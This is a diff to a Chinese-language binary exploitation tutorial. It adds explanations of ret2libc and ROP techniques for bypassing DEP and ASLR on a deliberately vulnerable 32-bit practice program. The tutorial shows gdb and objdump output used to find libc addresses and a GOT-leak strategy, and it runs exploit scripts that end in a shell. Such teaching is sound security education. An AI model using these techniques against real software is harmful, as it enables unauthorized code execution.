@@ -86,7 +86,10 @@ $ whoami<br>
 [用户名] <br><br><br>
 
 ### Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护
+现在我们将DEP打开，将stack protector和ASLR仍然关闭<br>
 $  gcc -fno-stack-protector -m32 -o level2 level1.c<br>
+如果此时level1的exp来进行测试的话，系统会拒绝执行我们的shellcode<br>
+如何执行shellcode呢？我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。<br><br><br>
 $ gdb ./level2<br>
 (gdb) break main<br>
 Breakpoint 1 at 0x80484ea<br>
@@ -98,7 +101,8 @@ $1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
 $2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
 (gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
 0xf7f5e02b<br>
-(gdb）quit<br>
+(gdb）quit<br><br><br>
+由此我们得到了system函数地址和“/bin/sh”字符串的地址。<br>
 $ python exp2.py<br>
 [+] Starting local process './level2': pid 14319<br>
 [*] Switching to interactive mode<br>
@@ -106,11 +110,13 @@ $ whoami<br>
 [用户名] <br><br>
   
 ### ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护
+接下来我们再打开ASLR保护：<br>
 $ sudo -s<br>
 $ echo 2 > /proc/sys/kernel/randomize_va_space<br>
 $ cat /proc/sys/kernel/randomize_va_space<br>
 2<br>
-$ exit<br>
+$ exit<br><br><br>
+那么如何解决地址随机化的问题呢？思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。由于因为程序本身在内存中的地址并不是随机的，所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表<br>
 $ objdump -d -j .plt level2 得到<br>
 level2：     文件格式 elf32-i386<br>
 Disassembly of section .plt:<br>
@@ -143,10 +149,14 @@ OFFSET   TYPE              VALUE <br>
 0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0<br>
 0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>
 0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0<br>
-
+我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。
+因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br><br>
+使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址<br>
 $ ldd level2<br>
 $ cp /lib32/libc.so.6 libc.so<br>
-$ objdump -d level2 | grep vulnerable_function0804843b <vulnerable_function>:<br>
+查看vulnerable_function地址<br>
+$ objdump -d level2 | grep vulnerable_function<br>
+0804843b <vulnerable_function>:<br>
  8048471:	e8 c5 ff ff ff       	call   804843b <vulnerable_function><br>
 $ python exp3.py<br>
 [ * ].......<br>
